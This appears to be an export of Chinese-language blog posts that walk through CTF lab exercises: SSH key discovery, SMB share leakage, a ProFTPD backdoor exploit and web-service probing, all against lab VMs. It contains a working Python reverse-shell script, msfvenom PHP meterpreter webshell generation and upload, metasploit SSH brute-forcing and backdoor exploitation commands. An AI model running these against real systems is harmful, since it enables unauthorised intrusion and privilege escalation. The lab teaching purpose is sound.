<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.bilibili.com/video/BV1SJ411h7VW">2020发布 CTF基础入门&#x2F;CTF教程零基础 渗透测试&#x2F;web安全&#x2F;CTF夺旗【整套教程】</a></li>
<li><a href="https://blog.csdn.net/qq_30247635/article/details/86257968">Netdiscover使用</a></li>
<li><a href="https://www.linuxprobe.com/10-nmap.html">十条nmap常用的扫描命令</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/26549845">(每日一工具)dirb目录扫描工具</a></li>
<li><a href="https://www.cnblogs.com/zlgxzswjy/p/10081873.html">SSH passphrase的破解</a></li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>nmap</tag>
        <tag>dirb</tag>
        <tag>john</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全0x02】SSH服务器夺旗</title>
    <url>/1052/</url>
    <content><![CDATA[<p>51CTO的网课，本篇通过探测服务器敏感文件获取普通用户SSH秘钥，连接服务器后探测定时任务，替换执行文件为反弹shell脚本提权，最后使用了暴力破解密码进行提权，最终夺取flag。</p>
<p>本篇使用工具nmap、dirb、nikto、metasploit。</p>
<span id="more"></span>

<h1 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><ul>
<li><p>探测靶场开放的服务与服务的版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-- nmap -sV 靶场IP地址</span><br></pre></td></tr></table></figure>
</li>
<li><p>探测靶场全部信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-- nmap -A -v 靶场IP地址</span><br></pre></td></tr></table></figure>
</li>
<li><p>探测靶场的操作系统类型与版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-- nmap -O 靶场IP地址</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a>dirb</h2><ul>
<li>挖掘靶场网站敏感信息</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb 靶场IP地址</span><br></pre></td></tr></table></figure>

<h2 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h2><ul>
<li>挖掘靶场网站敏感信息</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -host 靶场IP地址</span><br></pre></td></tr></table></figure>

<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><ul>
<li>基础命令</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">whoami</span> 查看当前用户</span><br><span class="line"><span class="built_in">id</span> 查看当前用户权限</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd 查看所有用户的列表</span><br><span class="line"><span class="built_in">cat</span> /etc/group 查看用户组</span><br><span class="line">find / -user 用户名  查看属于某些用户的文件</span><br></pre></td></tr></table></figure>

<ul>
<li>敏感文件目录</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/tmp 缓冲文件目录</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab 挖掘其他用户的定时任务</span><br></pre></td></tr></table></figure>

<h2 id="反弹shell-py"><a href="#反弹shell-py" class="headerlink" title="反弹shell(py)"></a>反弹shell(py)</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os,subprocess,socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;攻击机IP地址&quot;</span>,<span class="string">&quot;攻击机监听端口&quot;</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p = subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>

<h2 id="暴力破解ssh登录口令"><a href="#暴力破解ssh登录口令" class="headerlink" title="暴力破解ssh登录口令"></a>暴力破解ssh登录口令</h2><ul>
<li>cupp生成字典</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/jeanphorn/common-password.git</span><br><span class="line"><span class="built_in">chmod</span> +x cupp.py</span><br><span class="line"><span class="comment">#以交互方式创建字典</span></span><br><span class="line">./cupp.py -i</span><br></pre></td></tr></table></figure>

<ul>
<li>metasploit破解ssh密码</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">&gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">&gt; <span class="built_in">set</span> rhosts 192.168.1.113</span><br><span class="line">&gt; <span class="built_in">set</span> username hadi</span><br><span class="line">&gt; <span class="built_in">set</span> pass_file /root/Desktop/common-password/hadi.txt</span><br><span class="line">&gt; <span class="built_in">set</span> threads 5</span><br><span class="line">&gt; <span class="built_in">set</span> verbose <span class="literal">true</span></span><br><span class="line">&gt; run</span><br></pre></td></tr></table></figure>

<ul>
<li>优化会话显示带用户、目录的命令行界面</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">su - root</span><br></pre></td></tr></table></figure>

<h1 id="渗透记录"><a href="#渗透记录" class="headerlink" title="渗透记录"></a>渗透记录</h1><ol>
<li>nmap扫描靶机IP地址开放端口、系统信息等：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.113</span><br><span class="line">nmap -O 192.168.1.113</span><br></pre></td></tr></table></figure>

<p><img src="/1052/1.PNG"></p>
<p><img src="/1052/2.PNG"></p>
<ol start="2">
<li>访问http服务，搜集敏感信息，<strong>contact等信息很有可能是ssh登录用户</strong>：</li>
</ol>
<p><img src="/1052/3.PNG"></p>
<ol start="3">
<li>dirb扫网站目录，搜集敏感文件目录，nikto命令也可以：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.1.113</span><br><span class="line">nikto -host 192.168.1.113</span><br></pre></td></tr></table></figure>

<p><img src="/1052/4.PNG"></p>
<p><img src="/1052/5.PNG"></p>
<ol start="4">
<li>查看<code>/files</code>、<code>/icons</code>等目录，找到<code>VDSoyuAXiO.txt</code>这个奇怪的文件，打开发现是秘钥：</li>
</ol>
<p><img src="/1052/6.PNG"></p>
<p><img src="/1052/7.PNG"></p>
<ol start="5">
<li>wget下来，改名为id_rsa，并且修改权限为600，大胆猜测这个是首页contact信息<code>martin</code>用户的秘钥：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget <span class="string">&quot;http://192.168.1.113/icons/VDSoyuAXiO.txt&quot;</span></span><br><span class="line"><span class="built_in">mv</span> VDSoyuAXiO.txt id_rsa</span><br><span class="line"><span class="built_in">chmod</span> 600 id_rsa</span><br></pre></td></tr></table></figure>

<p><img src="/1052/8.PNG"></p>
<ol start="6">
<li>先连接靶机，看看能不能登录，不能的话再本地破解密码，这里是直接登陆成功了，另外注意一点，如果做完之前的实验，新实验靶机IP没有变的话，要先清掉已知主机：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf ~/.ssh/known_hosts</span><br><span class="line">ssh -i id_rsa martin@192.168.1.113</span><br></pre></td></tr></table></figure>

<p><img src="/1052/9.PNG"></p>
<ol start="7">
<li>martin用户没有root权限，探测敏感目录<code>/tmp</code>、<code>/etc/crontab</code>发现jimmy用户的5分钟自动定时任务，但是执行文件不存在：</li>
</ol>
<p><img src="/1052/10.PNG"></p>
<ol start="8">
<li>编写python反弹shell脚本作为执行文件，增加执行权限，同时查找攻击机未在使用的端口作为监听端口：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">touch</span> sekurity.py</span><br><span class="line">vi sekurity.py</span><br><span class="line"><span class="built_in">chmod</span> +x sekurity.py</span><br><span class="line"></span><br><span class="line">netstat -pantu</span><br><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>

<p>反弹shell脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os,subprocess,socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;攻击机IP地址&quot;</span>,<span class="string">&quot;攻击机监听端口&quot;</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p = subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>

<p><img src="/1052/11.PNG"></p>
<ol start="9">
<li>等五分钟左右，进入shell，查看用户是jimmy，结果也没有权限，获取不到flag：</li>
</ol>
<p><img src="/1052/12.PNG"></p>
<ol start="10">
<li>最后一个hadi用户只能尝试暴力破解，这里使用jeanphorn的common-password，从github上clone下来，交互界面进入：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/jeanphorn/common-password.git</span><br><span class="line"><span class="built_in">cd</span> /common-password</span><br><span class="line"><span class="built_in">chmod</span> +x cupp.py</span><br><span class="line"><span class="comment">#以交互方式创建字典</span></span><br><span class="line">./cupp.py -i</span><br></pre></td></tr></table></figure>

<p><img src="/1052/13.PNG"></p>
<ol start="11">
<li>编辑密码字典，name填hadi，添加随机数字，其他都不加：</li>
</ol>
<p><img src="/1052/14.PNG"></p>
<ol start="12">
<li>字典生成好了，进msfconsole破解，查看ssh_login模块的参数：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">&gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">&gt; show options</span><br></pre></td></tr></table></figure>

<p><img src="/1052/15.PNG"></p>
<ol start="13">
<li>编辑靶机IP、SSH用户名、密码字典、线程等参数：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">set</span> rhosts 192.168.1.113</span><br><span class="line">&gt; <span class="built_in">set</span> username hadi</span><br><span class="line">&gt; <span class="built_in">set</span> pass_file /root/Desktop/common-password/hadi.txt</span><br><span class="line">&gt; <span class="built_in">set</span> threads 5</span><br><span class="line">&gt; <span class="built_in">set</span> verbose <span class="literal">true</span></span><br><span class="line">&gt; run</span><br></pre></td></tr></table></figure>

<p><img src="/1052/16.PNG"></p>
<ol start="14">
<li>确认参数无误，开始run，等结果：</li>
</ol>
<p><img src="/1052/17.PNG"></p>
<ol start="15">
<li>这个字典竟然没密码，还是生成的简单了，实际上密码是hadi123，直接添加msf里，破解成功是这样显示的：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">set</span> password hadi123</span><br><span class="line">&gt; run</span><br><span class="line"></span><br><span class="line">&gt;sessions -i 1  <span class="comment">#进入编号1的交互session </span></span><br></pre></td></tr></table></figure>

<p><img src="/1052/18.PNG"></p>
<ol start="16">
<li>session里交互不是很方便，可以执行下面的python脚本把bash定向到回话中，优化交互界面：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/1052/19.PNG"></p>
<ol start="17">
<li>su提权，获取flag：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su - root</span><br><span class="line"><span class="built_in">cat</span> /root/flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/1052/20.PNG"></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.bilibili.com/video/BV1SJ411h7VW">2020发布 CTF基础入门&#x2F;CTF教程零基础 渗透测试&#x2F;web安全&#x2F;CTF夺旗【整套教程】</a></li>
<li><a href="https://blog.csdn.net/m0_46622606/article/details/105059054">2-3CTF夺旗入门教程–SSH服务测试（root权限）</a></li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>nmap</tag>
        <tag>dirb</tag>
        <tag>nikto</tag>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全0x03】SMB信息泄露</title>
    <url>/1053/</url>
    <content><![CDATA[<p>51CTO的网课，本篇针对SMB协议弱点分析，登录共享目录查找敏感文件；针对HTTP协议弱点分析，寻找突破点，登录后台上传webshell，提权获取flag。</p>
<p>本篇使用工具nmap、dirb、metasploit、webshell。</p>
<span id="more"></span>

<h1 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><ul>
<li><p>探测靶场开放的服务与服务的版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-- nmap -sV 靶场IP地址</span><br></pre></td></tr></table></figure>
</li>
<li><p>探测靶场全部信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-- nmap -A -v -T4 靶场IP地址</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a>dirb</h2><ul>
<li>挖掘靶场网站敏感信息</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb 靶场IP地址</span><br></pre></td></tr></table></figure>

<h2 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h2><ul>
<li>空口令&#x2F;弱口令尝试登录，获取敏感文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L 靶机IP</span><br><span class="line">smbclient <span class="string">&#x27;\\靶机IP\share&#x27;</span></span><br><span class="line">get 敏感文件</span><br></pre></td></tr></table></figure>

<ul>
<li>针对SMB协议远程溢出漏洞进行分析</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit samba版本号</span><br></pre></td></tr></table></figure>

<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><ul>
<li>登录</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -h 靶机IP -u Admin -p 口令</span><br></pre></td></tr></table></figure>

<h2 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h2><ul>
<li>启动监听</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">&gt;use exploit/multi/handler</span><br><span class="line">&gt;<span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">&gt;<span class="built_in">set</span> lhost 攻击机IP</span><br><span class="line">&gt;<span class="built_in">set</span> lport 攻击机端口</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>

<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><ul>
<li>生成webshell</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#制作webshell</span></span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机IP lport=监听端口 -f raw &gt; /root/Desktop/shell.php</span><br></pre></td></tr></table></figure>

<ul>
<li>上传webshell</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用找到的敏感信息登录后台，上传并执行webshell</span></span><br><span class="line"><span class="comment">#获得反弹的shell--WordPress上传theme 404.php</span></span><br><span class="line">http://靶机IP/wordpress/wp-content/themes/twentyfifteen/404.php</span><br></pre></td></tr></table></figure>

<h2 id="shell优化"><a href="#shell优化" class="headerlink" title="shell优化"></a>shell优化</h2><ul>
<li>优化会话显示带用户、目录的命令行界面</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<h1 id="渗透记录"><a href="#渗透记录" class="headerlink" title="渗透记录"></a>渗透记录</h1><ol>
<li>nmap扫描靶机IP地址开放端口、系统信息等：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.113</span><br><span class="line">nmap -A -v -T4 192.168.1.113</span><br></pre></td></tr></table></figure>

<p><img src="/1053/1.PNG"></p>
<p><img src="/1053/2.PNG"></p>
<ol start="2">
<li>访问smb服务，搜集敏感信息，share共享文件夹里可能有敏感信息：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L 192.168.1.113</span><br><span class="line">smbclient <span class="string">&#x27;\\192.168.1.113\share&#x27;</span></span><br><span class="line">get 敏感文件</span><br></pre></td></tr></table></figure>

<p><img src="/1053/3.PNG"></p>
<ol start="3">
<li>都查看一下，找到两个敏感文件<code>\share\deets.txt</code>和<code>\share\wordpress\wp-config.php</code>：</li>
</ol>
<p><img src="/1053/4.PNG"></p>
<p><img src="/1053/5.PNG"></p>
<ol start="4">
<li>利用搜集到的秘钥尝试连接mysql和ssh，均被拒绝：</li>
</ol>
<p><img src="/1053/6.PNG"></p>
<ol start="5">
<li>smb协议也可以用metasploit搜索可利用漏洞，这里无可利用漏洞：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit Samba smbd 3.X - 4.X</span><br><span class="line">searchsploit Samba smbd 4.3.11-Ubuntu</span><br></pre></td></tr></table></figure>

<p><img src="/1053/7.PNG"></p>
<ol start="6">
<li>dirb搜索目录，查找可利用文件，找到了登录后台：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.1.113</span><br></pre></td></tr></table></figure>

<p><img src="/1053/8.PNG"></p>
<ol start="7">
<li>尝试使用前面的mysql密码成功登录：</li>
</ol>
<p><img src="/1053/9.PNG"></p>
<ol start="8">
<li>生成反弹webshell脚本：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.114 lport=4444 -f raw &gt; /root/Desktop/shell.php</span><br></pre></td></tr></table></figure>

<p><img src="/1053/10.PNG"></p>
<ol start="9">
<li>metaspolit开启监听：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">&gt;use exploit/multi/handler</span><br><span class="line">&gt;<span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">&gt;<span class="built_in">set</span> lhost 192.168.1.114</span><br><span class="line">&gt;<span class="built_in">set</span> lport 4444</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>

<p><img src="/1053/11.PNG"></p>
<ol start="10">
<li>网页后台上传webshell：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用找到的敏感信息登录后台，上传并执行webshell</span></span><br><span class="line"><span class="comment">#获得反弹的shell--WordPress上传theme 404.php</span></span><br><span class="line">http://靶机IP/wordpress/wp-content/themes/twentyfifteen/404.php</span><br></pre></td></tr></table></figure>

<p><img src="/1053/12.PNG"></p>
<ol start="11">
<li>访问404网页，可以看到反弹shell成功：</li>
</ol>
<p><img src="/1053/13.PNG"></p>
<ol start="12">
<li>进入shell，优化输入，尝试切换root用户，失败：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/1053/14.PNG"></p>
<ol start="13">
<li>查看用户组，发现<strong>togie</strong>在<code>/home</code>目录下，是一个用户：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/1053/15.PNG"></p>
<ol start="14">
<li>切换到用户<strong>togie</strong>，密码是前面第3步搜集到的<code>12345</code>，查看权限，提权：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su togie</span><br><span class="line">sudo -l</span><br><span class="line">sudo su</span><br></pre></td></tr></table></figure>

<p><img src="/1053/16.PNG"></p>
<ol start="15">
<li>提权成功，切换到根目录，拿到flag：</li>
</ol>
<p><img src="/1053/17.PNG"></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.bilibili.com/video/BV1SJ411h7VW">2020发布 CTF基础入门&#x2F;CTF教程零基础 渗透测试&#x2F;web安全&#x2F;CTF夺旗【整套教程】</a></li>
<li><a href="https://blog.csdn.net/m0_46622606/article/details/105107489">3-1CTF夺旗入门教程–SMB信息泄露</a></li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>nmap</tag>
        <tag>dirb</tag>
        <tag>metasploit</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全0x04】FTP服务后门利用</title>
    <url>/1054/</url>
    <content><![CDATA[<p>51CTO的网课，本篇针对FTP服务后门，利用metasploit搜索可用payload渗透靶机，获取flag。</p>
<p>本篇使用工具nmap、metasploit。</p>
<span id="more"></span>

<h1 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><ul>
<li><p>探测靶场开放的服务与服务的版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-- nmap -sV 靶场IP地址</span><br></pre></td></tr></table></figure>
</li>
<li><p>探测靶场全部信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-- nmap -A -v -T4 靶场IP地址</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h2><ul>
<li>查找可利用漏洞</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit 对应服务及版本</span><br></pre></td></tr></table></figure>

<ul>
<li>渗透攻击</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">&gt;search 对应服务及版本</span><br><span class="line">&gt;use 对应exploit</span><br><span class="line"></span><br><span class="line">&gt;show payloads</span><br><span class="line">&gt;<span class="built_in">set</span> payload 对应payload</span><br><span class="line"></span><br><span class="line">&gt;show options</span><br><span class="line"></span><br><span class="line">&gt;<span class="built_in">set</span> rhosts 靶机IP地址</span><br><span class="line">&gt;<span class="built_in">set</span> lhost 攻击机IP地址</span><br><span class="line"></span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>

<h2 id="shell优化"><a href="#shell优化" class="headerlink" title="shell优化"></a>shell优化</h2><ul>
<li>优化会话显示带用户、目录的命令行界面</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<h1 id="渗透记录"><a href="#渗透记录" class="headerlink" title="渗透记录"></a>渗透记录</h1><ol>
<li>nmap扫描靶机IP地址开放端口、系统信息等：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.113</span><br><span class="line">nmap -A -v -T4 192.168.1.113</span><br></pre></td></tr></table></figure>

<p><img src="/1054/1.PNG"></p>
<p><img src="/1054/2.PNG"></p>
<ol start="2">
<li>搜索该ftp服务版本，查找可利用漏洞，看到metasploit里有可用漏洞：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit ProFTPD 1.3.3c</span><br></pre></td></tr></table></figure>

<p><img src="/1054/3.PNG"></p>
<ol start="3">
<li>进metasploit，搜索可利用漏洞，选择版本对应的这个：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">&gt;search ProFTPD 1.3.3c</span><br><span class="line">&gt;use exploit/unix/ftp/proftpd_133c_backdoor</span><br></pre></td></tr></table></figure>

<p><img src="/1054/4.PNG"></p>
<ol start="4">
<li>查看可利用payloads，选择这个：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;show payloads</span><br><span class="line">&gt;<span class="built_in">set</span> payload cmd/unix/reverse</span><br></pre></td></tr></table></figure>

<p><img src="/1054/5.PNG"></p>
<ol start="5">
<li>设置靶机IP和攻击机IP：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">set</span> rhosts 192.168.1.113</span><br><span class="line">&gt;<span class="built_in">set</span> lhost 192.168.1.114</span><br></pre></td></tr></table></figure>

<p><img src="/1054/6.PNG"></p>
<ol start="6">
<li>执行渗透，成功拿到root权限：</li>
</ol>
<p><img src="/1054/7.PNG"></p>
<ol start="7">
<li>优化shell，切换到根目录拿到flag，这里是有flag的，可能我这个靶机镜像被之前的使用者删掉了：</li>
</ol>
<p><img src="/1054/8.PNG"></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.bilibili.com/video/BV1SJ411h7VW">2020发布 CTF基础入门&#x2F;CTF教程零基础 渗透测试&#x2F;web安全&#x2F;CTF夺旗【整套教程】</a></li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>nmap</tag>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全0x05】web安全服务夺旗</title>
    <url>/1055/</url>
    <content><![CDATA[<p>51CTO的网课，本篇利用nmap搜索开放端口，逐一对ftp、ssh、https等端口进行安全测试，探测敏感信息，获取flag。</p>
<p>本篇使用工具nmap，dirb。</p>
<span id="more"></span>

<h1 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><ul>
<li>快速扫描靶场全部开放端口信息</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-- nmap -p- -T4 靶场IP地址</span><br></pre></td></tr></table></figure>

<ul>
<li>探测靶场全部信息</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-- nmap -A -v -T4 靶场IP地址</span><br></pre></td></tr></table></figure>

<h2 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a>dirb</h2><ul>
<li>挖掘靶场网站敏感信息</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb 靶场IP地址:端口号</span><br></pre></td></tr></table></figure>

<h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><p><strong>语法：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc [-hlnruz][-g&lt;网关...&gt;][-G&lt;指向器数目&gt;][-i&lt;延迟秒数&gt;][-o&lt;输出文件&gt;][-p&lt;通信端口&gt;][-s&lt;来源位址&gt;][-v...][-w&lt;超时秒数&gt;][主机名称][通信端口...]</span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li>-g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。</li>
<li>-G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。</li>
<li>-h 在线帮助。</li>
<li>-i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。</li>
<li>-l 使用监听模式，管控传入的资料。</li>
<li>-n 直接使用IP地址，而不通过域名服务器。</li>
<li>-o&lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</li>
<li>-p&lt;通信端口&gt; 设置本地主机使用的通信端口。</li>
<li>-r 乱数指定本地与远端主机的通信端口。</li>
<li>-s&lt;来源位址&gt; 设置本地主机送出数据包的IP地址。</li>
<li>-u 使用UDP传输协议。</li>
<li>-v 显示指令执行过程。</li>
<li>-w&lt;超时秒数&gt; 设置等待连线的时间。</li>
<li>-z 使用0输入&#x2F;输出模式，只在扫描通信端口时使用。</li>
</ul>
<p><strong>实例：</strong></p>
<ol>
<li>扫描192.168.0.3 的端口 范围是 1-100:</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nc -v -z -w2 192.168.0.3 1-100 </span></span><br><span class="line">192.168.0.3: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) [192.168.0.3] 80 (http) open</span><br><span class="line">(UNKNOWN) [192.168.0.3] 23 (telnet) open</span><br><span class="line">(UNKNOWN) [192.168.0.3] 22 (ssh) open</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>扫描UDP端口:</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nc -u -z -w2 192.168.0.1 1-1000 //扫描192.168.0.3 的端口 范围是 1-1000</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>扫描指定端口:</li>
</ol>
